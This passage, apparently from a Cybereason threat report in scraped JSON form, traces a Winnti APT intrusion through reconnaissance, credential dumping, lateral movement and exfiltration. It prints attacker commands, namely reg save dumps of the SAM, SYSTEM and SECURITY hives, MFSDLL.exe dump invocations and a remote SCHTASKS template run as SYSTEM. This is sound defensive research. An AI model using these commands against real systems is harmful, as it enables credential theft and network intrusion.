+                {
+                    "id": "<sentence_0x54a17f97>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "systeminfo",
+                    "html": "<ul>\n<li>systeminfo</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0x84154449>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "net start",
+                    "html": "<ul>\n<li>net start</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0x2162f526>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "net user",
+                    "html": "<ul>\n<li>net user</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0x4c022f45>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "dir c:\\",
+                    "html": "<ul>\n<li>dir c:\\ </li>\n</ul>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0xe404ce53>",
+            "title": "Advanced Stages Reconnaissance",
+            "title_level": 4,
+            "sentences": [
+                {
+                    "id": "<sentence_0x9a0073b>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x25ef5d6c>": "https://attack.mitre.org/techniques/T1053/"
+                    },
+                    "text": "After establishing a foothold on multiple machines in the network, Winnti began leveraging Scheduled Tasks to execute batch scripts by the names cc.bat or bc.bat. The content of these batch files varied from one machine to another, each time containing different reconnaissance commands based on the attackers goals. Examples of this type of reconnaissance commands are as follows:",
+                    "html": "<p>After establishing a foothold on multiple machines in the network, Winnti began leveraging <a href=\"https://attack.mitre.org/techniques/T1053/\" rel=\"noopener\" target=\"_blank\">Scheduled Tasks</a> to execute batch scripts by the names \u201ccc.bat\u201d or \u201cbc.bat\u201d. The content of these batch files varied from one machine to another, each time containing different reconnaissance commands based on the attackers\u2019 goals. Examples of this type of reconnaissance commands are as follows: </p>"
+                },
+                {
+                    "id": "<sentence_0x3c88423a>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<table_0x9fb1d3bf>": {
+                            "0": {
+                                "0": "Command",
+                                "1": "fsutil fsinfo drives",
+                                "2": "ipconfig",
+                                "3": "nbtstat",
+                                "4": "net accounts",
+                                "5": "net group",
+                                "6": "net session",
+                                "7": "net share",
+                                "8": "net start",
+                                "9": "net time",
+                                "10": "net use",
+                                "11": "net user",
+                                "12": "net view",
+                                "13": "netstat",
+                                "14": "nslookup",
+                                "15": "ping",
+                                "16": "query user",
+                                "17": "systeminfo",
+                                "18": "tasklist",
+                                "19": "tracert",
+                                "20": "whoami"
+                            },
+                            "1": {
+                                "0": "Technique",
+                                "1": "System Drives Discovery",
+                                "2": "System Network Configuration Discovery",
+                                "3": "Remote System Discovery",
+                                "4": "Password Policy Discovery",
+                                "5": "Permission Groups Discovery",
+                                "6": "System Network Session Discovery",
+                                "7": "Network Share Discovery",
+                                "8": "System Service Discovery",
+                                "9": "System Time Discovery",
+                                "10": "System Network Connections Discovery",
+                                "11": "Account Discovery",
+                                "12": "Network Share Discovery",
+                                "13": "System Network Connections Discovery",
+                                "14": "System DNS Configuration Discovery",
+                                "15": "Remote System Discovery",
+                                "16": "System Owner/User Discovery",
+                                "17": "System Information Discovery",
+                                "18": "Process Discovery",
+                                "19": "Remote System Route Discovery",
+                                "20": "Logged On User Discovery"
+                            }
+                        }
+                    },
+                    "text": "",
+                    "html": "<table>\n<tbody>\n<tr>\n<td>\n<p>Command</p>\n</td>\n<td>\n<p>Technique</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>fsutil fsinfo drives</p>\n</td>\n<td>\n<p>System Drives Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>ipconfig</p>\n</td>\n<td>\n<p>System Network Configuration Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>nbtstat</p>\n</td>\n<td>\n<p>Remote System Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>net accounts</p>\n</td>\n<td>\n<p>Password Policy Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>net group</p>\n</td>\n<td>\n<p>Permission Groups Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>net session</p>\n</td>\n<td>\n<p>System Network Session Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>net share</p>\n</td>\n<td>\n<p>Network Share Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>net start</p>\n</td>\n<td>\n<p>System Service Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>net time</p>\n</td>\n<td>\n<p>System Time Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>net use</p>\n</td>\n<td>\n<p>System Network Connections Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>net user</p>\n</td>\n<td>\n<p>Account Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>net view</p>\n</td>\n<td>\n<p>Network Share Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>netstat</p>\n</td>\n<td>\n<p>System Network Connections Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>nslookup</p>\n</td>\n<td>\n<p>System DNS Configuration Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>ping</p>\n</td>\n<td>\n<p>Remote System Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>query user</p>\n</td>\n<td>\n<p>System Owner/User Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>systeminfo</p>\n</td>\n<td>\n<p>System Information Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>tasklist</p>\n</td>\n<td>\n<p>Process Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>tracert</p>\n</td>\n<td>\n<p>Remote System Route Discovery</p>\n</td>\n</tr>\n<tr>\n<td>\n<p>whoami</p>\n</td>\n<td>\n<p>Logged On User Discovery</p>\n</td>\n</tr>\n</tbody>\n</table>"
+                },
+                {
+                    "id": "<sentence_0x2b2e1a31>",
+                    "is_empty": true,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "",
+                    "html": "<p> </p>"
+                },
+                {
+                    "id": "<sentence_0x79db86f3>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x6df786df>": "https://attack.mitre.org/software/S0105/",
+                        "<a_0x91512b67>": "https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc755162(v=ws.11)https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc755162(v=ws.11)",
+                        "<a_0xd661f00f>": "https://attack.mitre.org/techniques/T1560/001/"
+                    },
+                    "text": "When the attackers gained access to a desired domain environment, they started gathering information about the domain using built-in Windows commands again. In this phase, Cybereason Nocturnus IR team observed additional queries for users in administrative groups along with execution of Dsquery and Dsget commands. The attackers then compressed using makecab.exe the collected information and exfiltrated it to their servers.",
+                    "html": "<p>When the attackers gained access to a desired domain environment, they started gathering information about the domain using built-in Windows commands again. In this phase, Cybereason Nocturnus IR team observed additional queries for users in administrative groups along with execution of <a href=\"https://attack.mitre.org/software/S0105/\">Dsquery</a> and <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc755162(v=ws.11)https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc755162(v=ws.11)\">Dsget</a> commands. The attackers then compressed using <a href=\"https://attack.mitre.org/techniques/T1560/001/\" rel=\"noopener\" target=\"_blank\">makecab.exe</a> the collected information and exfiltrated it to their servers.</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x9e62eef1>",
+            "title": "Credential Dumping",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0xc2e9f265>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xbc66e08e>": "https://attack.mitre.org/techniques/T1003/002/"
+                    },
+                    "text": "During the attack, Cybereason Nocturnus observed two methods that were utilized for credential dumping: the first one used the known reg save command, and the second was an unknown tool, named MFSDLL.exe.",
+                    "html": "<p>During the attack, Cybereason Nocturnus observed two methods that were utilized for credential dumping: the first one used the known <a href=\"https://attack.mitre.org/techniques/T1003/002/\" rel=\"noopener\" target=\"_blank\">reg save</a> command, and the second was an unknown tool, named MFSDLL.exe.</p>"
+                },
+                {
+                    "id": "<sentence_0xe52549d6>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Using the reg save command, the attackers attempted to dump the SYSTEM, SAM and SECURITY registry hives as follows:",
+                    "html": "<p>Using the reg save command, the attackers attempted to dump the SYSTEM, SAM and SECURITY registry hives as follows:</p>"
+                },
+                {
+                    "id": "<sentence_0x2e3857fb>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "reg save HKLM\\SYSTEM system.hiv",
+                    "html": "<ul>\n<li>reg save HKLM\\SYSTEM system.hiv</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0x56748e6d>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "reg save HKLM\\SAM sam.hiv",
+                    "html": "<ul>\n<li>reg save HKLM\\SAM sam.hiv</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0xd0ef9377>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "reg save HKLM\\SECURITY security.hiv",
+                    "html": "<ul>\n<li>reg save HKLM\\SECURITY security.hiv</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0xc73ec515>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Dumping these hives ultimately enabled the attackers to crack password hashes locally.",
+                    "html": "<p>Dumping these hives ultimately enabled the attackers to crack password hashes locally. </p>"
+                },
+                {
+                    "id": "<sentence_0xdfb3eb97>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The second tool used by the attackers to dump credentials was a previously undocumented executable named MFSDLL.exe. At the time of the investigation, Cybereason was not able to recover a copy of it to examine its content. Nevertheless, the Cybereason XDR solution managed to detect how this file was used as well as what it loaded. The attackers used this tool in the following manner:",
+                    "html": "<p>The second tool used by the attackers to dump credentials was a previously undocumented executable named MFSDLL.exe. At the time of the investigation, Cybereason was not able to recover a copy of it to examine its content. Nevertheless, the Cybereason XDR solution managed to detect how this file was used as well as what it loaded. The attackers used this tool in the following manner:</p>"
+                },
+                {
+                    "id": "<sentence_0x6ff933e5>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "MFSDLL.exe <12 characters string> <file> <parameter> (for example - MSFDLL.exe <12 characters string> 1.log dump)",
+                    "html": "<p>MFSDLL.exe &lt;12 characters string&gt; &lt;file&gt; &lt;parameter&gt; (for example - MSFDLL.exe &lt;12 characters string&gt; 1.log dump)</p>"
+                },
+                {
+                    "id": "<sentence_0x20f65aba>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The variations it was found to be used were:",
+                    "html": "<p>The variations it was found to be used were:</p>"
+                },
+                {
+                    "id": "<sentence_0xee13d703>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "MFSDLL.exe <12 characters string> <file_name>.log domain",
+                    "html": "<ul>\n<li>MFSDLL.exe &lt;12 characters string&gt; &lt;file_name&gt;.log domain</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0x49c07b7c>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "MFSDLL.exe <12 characters string> <file_name>.log dump",
+                    "html": "<ul>\n<li>MFSDLL.exe &lt;12 characters string&gt; &lt;file_name&gt;.log dump</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0x94e68281>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "MFSDLL.exe <12 characters string> <file_name>.log password",
+                    "html": "<ul>\n<li>MFSDLL.exe &lt;12 characters string&gt; &lt;file_name&gt;.log password</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0xdf3f33be>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "MFSDLL.exe <12 characters string> <file_name>.log sam",
+                    "html": "<ul>\n<li>MFSDLL.exe &lt;12 characters string&gt; &lt;file_name&gt;.log sam</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0xf829a478>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "MFSDLL.exe <12 characters string> <file_name>.log minidump",
+                    "html": "<ul>\n<li>MFSDLL.exe &lt;12 characters string&gt; &lt;file_name&gt;.log minidump</li>\n</ul>"
+                },
+                {
+                    "id": "<sentence_0xb548d227>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x5eeebadc>": "https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/",
+                        "<a_0xb7b79d99>": "https://attack.mitre.org/software/S0002/"
+                    },
+                    "text": "The Nocturnus IR team also observed the loading of a DLL file called mktzx64.dll along with the sam command execution. The name of this DLL was mentioned in a report by ESET detailing an espionage campaign in Asia linked to China, and it suggests the use of Mimikatz, a popular credential dumping tool.",
+                    "html": "<p>The Nocturnus IR team also observed the loading of a DLL file called mktzx64.dll along with the sam command execution. The name of this DLL was mentioned in a <a href=\"https://www.welivesecurity.com/2020/05/14/mikroceen-spying-backdoor-high-profile-networks-central-asia/\" rel=\"noopener\" target=\"_blank\">report by ESET</a> detailing an espionage campaign in Asia linked to China, and it suggests the use of <a href=\"https://attack.mitre.org/software/S0002/\" rel=\"noopener\" target=\"_blank\">Mimikatz</a>, a popular credential dumping tool.</p>"
+                },
+                {
+                    "id": "<sentence_0xdf60616c>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xa959fc3e>": "https://www.mandiant.com/resources/game-over-detecting-and-stopping-an-apt41-operation"
+                    },
+                    "text": "This manner of execution resembles ACEHASH, a credential theft and password dumping utility, which was leveraged by the Winnti group in the past, using commands such as c64.exe f64.data \"9839D7F1A0 -m:",
+                    "html": "<p>This manner of execution resembles ACEHASH, a credential theft and password dumping utility, which was leveraged by the Winnti group in the <a href=\"https://www.mandiant.com/resources/game-over-detecting-and-stopping-an-apt41-operation\" rel=\"noopener\" target=\"_blank\">past</a>, using commands such as \u201cc64.exe f64.data \"9839D7F1A0 -m\u201d:</p>"
+                },
+                {
+                    "id": "<sentence_0x454402f6>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x34acb05>": "https://www.cybereason.com/hs-fs/hubfs/image1-Apr-26-2022-07-01-24-88-PM.png?width=872&name=image1-Apr-26-2022-07-01-24-88-PM.png"
+                    },
+                    "text": "MFSDLL.exe executions as seen in the Cybereason XDR Platform",
+                    "html": "<p><img alt=\"image1-Apr-26-2022-07-01-24-88-PM\" src=\"https://www.cybereason.com/hs-fs/hubfs/image1-Apr-26-2022-07-01-24-88-PM.png?width=872&amp;name=image1-Apr-26-2022-07-01-24-88-PM.png\" width=\"872\"/>MFSDLL.exe executions as seen in the Cybereason XDR Platform</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x1572aa20>",
+            "title": "Lateral Movement",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0x3931dde1>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x45cae4fb>": "https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks"
+                    },
+                    "text": "For lateral movement, the attackers used the Windows-native Schtasks command to create remote scheduled tasks, and to execute malicious code through the aforementioned batch files:",
+                    "html": "<p>For lateral movement, the attackers used the Windows-native <a href=\"https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks\" rel=\"noopener\" target=\"_blank\">Schtasks </a>command to create remote scheduled tasks, and to execute malicious code through the aforementioned batch files: </p>"
+                },
+                {
+                    "id": "<sentence_0xc26d607f>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<table_0x5630da3e>": {
+                            "0": {
+                                "0": "SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM"
+                            }
+                        }
+                    },
+                    "text": "",
+                    "html": "<table>\n<tbody>\n<tr>\n<td>\n<p>SCHTASKS /Create /S &lt;IP Address&gt; /U &lt;Username&gt; /p &lt;Password&gt; /SC ONCE /TN test /TR &lt;Path to a Batch File&gt; /ST &lt;Time&gt; /RU SYSTEM</p>\n</td>\n</tr>\n</tbody>\n</table>"
+                },
+                {
+                    "id": "<sentence_0x398b25e5>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The scheduled task command line used for lateral movement",
+                    "html": "<p>The scheduled task command line used for lateral movement</p>"
+                },
+                {
+                    "id": "<sentence_0x995bd8fd>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The scheduled tasks the attackers have created were created with the name test, using compromised Domain Administrator credentials. The batch file the scheduled task executed was executed from a temp folder using the local SYSTEM account.",
+                    "html": "<p>The scheduled tasks the attackers have created were created with the name test, using compromised Domain Administrator credentials. The batch file the scheduled task executed was executed from a temp folder using the local SYSTEM account.</p>"
+                },
+                {
+                    "id": "<sentence_0xe7f5eb8c>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "The attackers used these scheduled tasks to execute commands on dozens of compromised machines throughout this stage of the attack. The batch files content have changed from one phase of the attack to another, which were initially used to execute reconnaissance commands and later on were used in order to distribute malicious binaries.",
+                    "html": "<p>The attackers used these scheduled tasks to execute commands on dozens of compromised machines throughout this stage of the attack. The batch files\u2019 content have changed from one phase of the attack to another, which were initially used to execute reconnaissance commands and later on were used in order to distribute malicious binaries. </p>"
+                },
+                {
+                    "id": "<sentence_0x2c7f5444>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Among the compromised machines, the attackers were able to expand their control to the Domain Controllers using the same method. Once the Domain Admin credentials were obtained, the attackers were able to move laterally and infect a large number of hosts using the stolen credentials.",
+                    "html": "<p>Among the compromised machines, the attackers were able to expand their control to the Domain Controllers using the same method. Once the Domain Admin credentials were obtained, the attackers were able to move laterally and infect a large number of hosts using the stolen credentials. </p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x1440ee08>",
+            "title": "Data Collection and Exfiltration",
+            "title_level": 3,
+            "sentences": [
+                {
+                    "id": "<sentence_0xfc75522a>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x4ea7186f>": "https://www.win-rar.com/start.html?&L=0"
+                    },
+                    "text": "To collect data efficiently, the attackers have utilized a renamed Chinese-language version of WinRAR to create password-protected archives containing the stolen data. The WinRAR executable is a 32-bit command-line version of the legitimate WinRAR application. The executable was renamed to rundll32.exe, a legitimate Windows program, in order to disguise it and silently blend it in with other Windows system files:",
+                    "html": "<p>To collect data efficiently, the attackers have utilized a renamed Chinese-language version of <a href=\"https://www.win-rar.com/start.html?&amp;L=0\" rel=\"noopener\" target=\"_blank\">WinRAR</a> to create password-protected archives containing the stolen data. The WinRAR executable is a 32-bit command-line version of the legitimate WinRAR application. The executable was renamed to rundll32.exe, a legitimate Windows program, in order to disguise it and silently blend it in with other Windows system files:</p>"
+                },
+                {
+                    "id": "<sentence_0x267862c5>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<img_0x5b949f16>": "https://www.cybereason.com/hs-fs/hubfs/image6-Apr-26-2022-07-02-27-16-PM.png?width=628&name=image6-Apr-26-2022-07-02-27-16-PM.png"
+                    },
+                    "text": "The WinRAR renamed version",
+                    "html": "<p><img alt=\"image6-Apr-26-2022-07-02-27-16-PM\" src=\"https://www.cybereason.com/hs-fs/hubfs/image6-Apr-26-2022-07-02-27-16-PM.png?width=628&amp;name=image6-Apr-26-2022-07-02-27-16-PM.png\" width=\"628\"/>The WinRAR renamed version</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x9c7be0b1>",
+            "title": "Conclusions",
+            "title_level": 2,
+            "sentences": [
+                {
+                    "id": "<sentence_0x506516e3>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "In the first part of this Winnti research, we reported the discovery of multiple sets of intrusions that went undetected for years. These intrusions targeted technology and manufacturing companies in multiple regions of the world to steal sensitive information for cyber espionage purposes.",
+                    "html": "<p>In the first part of this Winnti research, we reported the discovery of multiple sets of intrusions that went undetected for years. These intrusions targeted technology and manufacturing companies in multiple regions of the world to steal sensitive information for cyber espionage purposes. </p>"
+                },
+                {
+                    "id": "<sentence_0x847a712b>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "Based on our analysis and the information available, we assess with moderate-to-high confidence that the attacks described in this report were carried out by the notorious Winnti APT Group, a highly sophisticated APT group operating on behalf of Chinese state interests that has been active since at least 2010. The group has been known over the years for its focus on intellectual property theft.",
+                    "html": "<p>Based on our analysis and the information available, we assess with moderate-to-high confidence that the attacks described in this report were carried out by the notorious Winnti APT Group, a highly sophisticated APT group operating on behalf of Chinese state interests that has been active since at least 2010. The group has been known over the years for its focus on intellectual property theft. </p>"
+                },
+                {
+                    "id": "<sentence_0x652c8814>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0xc9fa346>": "https://www.cybereason.com/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive"
+                    },
+                    "text": "In this part of the research, we offered readers a unique glimpse into the attackers playbook, forensically tracing the attack steps from initial compromise all the way through data exfiltration. In part two of this research, we will take a deep dive into the Winnti malware arsenal, analyzing the different implants and unique infection chains.",
+                    "html": "<p>In this part of the research, we offered readers a unique glimpse into the attacker\u2019s playbook, forensically tracing the attack steps from initial compromise all the way through data exfiltration. In <a href=\"/blog/operation-cuckoobees-a-winnti-malware-arsenal-deep-dive\" rel=\"noopener\" target=\"_blank\">part two of this research</a>, we will take a deep dive into the Winnti malware arsenal, analyzing the different implants and unique infection chains. </p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x274020a0>",
+            "title": "Acknowledgments",
+            "title_level": 2,
+            "sentences": [
+                {
+                    "id": "<sentence_0x28082308>",
+                    "is_empty": false,
+                    "have_tags": false,
+                    "tags": {},
+                    "text": "This research has not been possible without the tireless effort, analysis, attention to details and contribution of the Cybereason Incident Response team. Special thanks and appreciation goes to Matt Hart, Yusuke Shimizu, Niamh OConnor, Jim Hung, and Omer Yampel.",
+                    "html": "<p>This research has not been possible without the tireless effort, analysis, attention to details and contribution of the Cybereason Incident Response team. Special thanks and appreciation goes to Matt Hart, Yusuke Shimizu, Niamh O\u2019Connor, Jim Hung, and Omer Yampel. </p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0xaa65a4dc>",
+            "title": "Indicators of Compromise",
+            "title_level": 2,
+            "sentences": [
+                {
+                    "id": "<sentence_0x25644553>",
+                    "is_empty": false,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x561fdc7a>": "https://www.cybereason.com/company/contact-us"
+                    },
+                    "text": "LOOKING FOR THE IOCs? CLICK ON THE CHATBOT DISPLAYED IN LOWER-RIGHT OF YOUR SCREEN FOR ACCESS. Due to the sensitive nature of the attack, not all IOCs observed by Cybereason can be shared in our public report. Please contact us for more information.",
+                    "html": "<p>LOOKING FOR THE IOCs? CLICK ON THE CHATBOT DISPLAYED IN LOWER-RIGHT OF YOUR SCREEN FOR ACCESS. Due to the sensitive nature of the attack, not all IOCs observed by Cybereason can be shared in our public report. <a href=\"/company/contact-us\" rel=\"noopener\" target=\"_blank\">Please contact us for more information</a>.</p>"
+                }
+            ]
+        },
+        {
+            "id": "<chapter_0x9506efad>",
+            "title": "MITRE ATT&CK BREAKDOWN",
+            "title_level": 2,
+            "sentences": [
+                {
+                    "id": "<sentence_0xe0b18df7>",
+                    "is_empty": true,
+                    "have_tags": true,
+                    "tags": {
+                        "<a_0x6e69f970>": "https://attack.mitre.org/techniques/T1589/001/",
+                        "<a_0x462dfa26>": "https://attack.mitre.org/techniques/T1190/",
+                        "<a_0x25ef5d6c>": "https://attack.mitre.org/techniques/T1053/",
+                        "<a_0x3189017d>": "https://attack.mitre.org/techniques/T1505/003/",
+                        "<a_0x9ca07eed>": "https://attack.mitre.org/techniques/T1543/003/",
+                        "<a_0xb737355>": "https://attack.mitre.org/techniques/T1574/002/",
+                        "<a_0x40b41ec6>": "https://attack.mitre.org/techniques/T1590/",
+                        "<a_0xcb9457c5>": "https://attack.mitre.org/techniques/T1195/",
+                        "<a_0xdeadbe6>": "https://attack.mitre.org/techniques/T1559/",
+                        "<a_0x8345c85a>": "https://attack.mitre.org/techniques/T1014/",
+                        "<a_0x9bc72441>": "https://attack.mitre.org/techniques/T1203/",
+                        "<a_0x35bc6e0a>": "https://attack.mitre.org/techniques/T1055/001/",
+                        "<a_0xe1e2874b>": "https://attack.mitre.org/techniques/T1036/005/",
+                        "<a_0x55c61da5>": "https://attack.mitre.org/techniques/T1059/003/",
+                        "<a_0x9213e9d7>": "https://attack.mitre.org/techniques/T1053/005/",
+                        "<a_0x99797e67>": "https://attack.mitre.org/techniques/T1059/005/",
+                        "<a_0x4c239275>": "https://attack.mitre.org/techniques/T1078/002/",
+                        "<a_0xbbab79d2>": "https://attack.mitre.org/techniques/T1620/",
+                        "<a_0xa8704bda>": "https://attack.mitre.org/techniques/T1106/",
+                        "<a_0x805cc42c>": "https://attack.mitre.org/techniques/T1078/003/",
+                        "<a_0x9dbd50f3>": "https://attack.mitre.org/techniques/T1218/011/",
+                        "<a_0x742fdb41>": "https://attack.mitre.org/techniques/T1547/006/",
+                        "<table_0x7b46d1ed>": {
+                            "0": {
+                                "0": "Reconnaissance",
+                                "1": "Gather Victim Identity Information: Credentials",
+                                "2": "Gather Victim Network Information",
+                                "3": "",
+                                "4": "",
+                                "5": "",
+                                "6": "",
+                                "7": "",
+                                "8": ""
+                            },
+                            "1": {
+                                "0": "Initial Access",
+                                "1": "Exploit Public-Facing Application",
+                                "2": "Supply Chain Compromise",
+                                "3": "",
+                                "4": "",
+                                "5": "",
+                                "6": "",
+                                "7": "",
+                                "8": ""
+                            },
+                            "2": {
+                                "0": "Execution",
+                                "1": "Scheduled Task/Job",
+                                "2": "Inter-process communication",
+                                "3": "Exploitation for Client Execution",
+                                "4": "Command and Scripting Interpreter: Windows Command Shell",
+                                "5": "Command and Scripting Interpreter: Visual Basic",
+                                "6": "Native API",
+                                "7": "",
+                                "8": ""
+                            },
+                            "3": {
+                                "0": "Persistence",
+                                "1": "Server Software Component: Web Shell",
+                                "2": "Hijack Execution Flow: DLL Side-Loading",
+                                "3": "Process Injection: Dynamic-link Library Injection",
+                                "4": "Scheduled Task/Job: Scheduled Task",
+                                "5": "Valid Accounts: Domain Accounts",
+                                "6": "Valid Accounts: Local Accounts",
+                                "7": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
+                                "8": ""
+                            },
+                            "4": {
+                                "0": "Privilege Escalation",
+                                "1": "Create or Modify System Process: Windows Service",
+                                "2": "",
+                                "3": "Process Injection: Dynamic-link Library Injection",
+                                "4": "Scheduled Task/Job: Scheduled Task",
+                                "5": "Valid Accounts: Domain Accounts",
+                                "6": "Valid Accounts: Local Accounts",
+                                "7": "",
+                                "8": ""
+                            },
+                            "5": {
+                                "0": "Defense Evasion",
+                                "1": "Hijack Execution Flow: DLL Side-Loading",
+                                "2": "Rootkit",
+                                "3": "Masquerading: Match Legitimate Name or Location",
+                                "4": "Process Injection: Dynamic-link Library Injection",
+                                "5": "Reflective Code Loading",
+                                "6": "Signed Binary Proxy Execution: Rundll32",
+                                "7": "Valid Accounts: Domain Accounts",
+                                "8": "Valid Accounts: Local Accounts"
+                            }
+                        }
+                    },
+                    "text": "",
+                    "html": "<table>\n<tbody>\n<tr>\n<td>\n<p>Reconnaissance</p>\n</td>\n<td>\n<p>Initial Access</p>\n</td>\n<td>\n<p>Execution</p>\n</td>\n<td>\n<p>Persistence</p>\n</td>\n<td>\n<p>Privilege Escalation</p>\n</td>\n<td>\n<p>Defense Evasion</p>\n</td>\n</tr>\n<tr>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1589/001/\">Gather Victim Identity Information: Credentials</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1190/\">Exploit Public-Facing Application</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1053/\">Scheduled Task/Job</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1505/003/\">Server Software Component: Web Shell</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1543/003/\">Create or Modify System Process: Windows Service</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1574/002/\">Hijack Execution Flow: DLL Side-Loading</a></p>\n</td>\n</tr>\n<tr>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1590/\">Gather Victim Network Information</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1195/\">Supply Chain Compromise</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1559/\">Inter-process communication</a></p>\n</td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1574/002/\">Hijack Execution Flow: DLL Side-Loading</a></p>\n</td>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1014/\">Rootkit</a></p>\n</td>\n</tr>\n<tr>\n<td> </td>\n<td> </td>\n<td>\n<p><a href=\"https://attack.mitre.org/techniques/T1203/\">Exploitation for 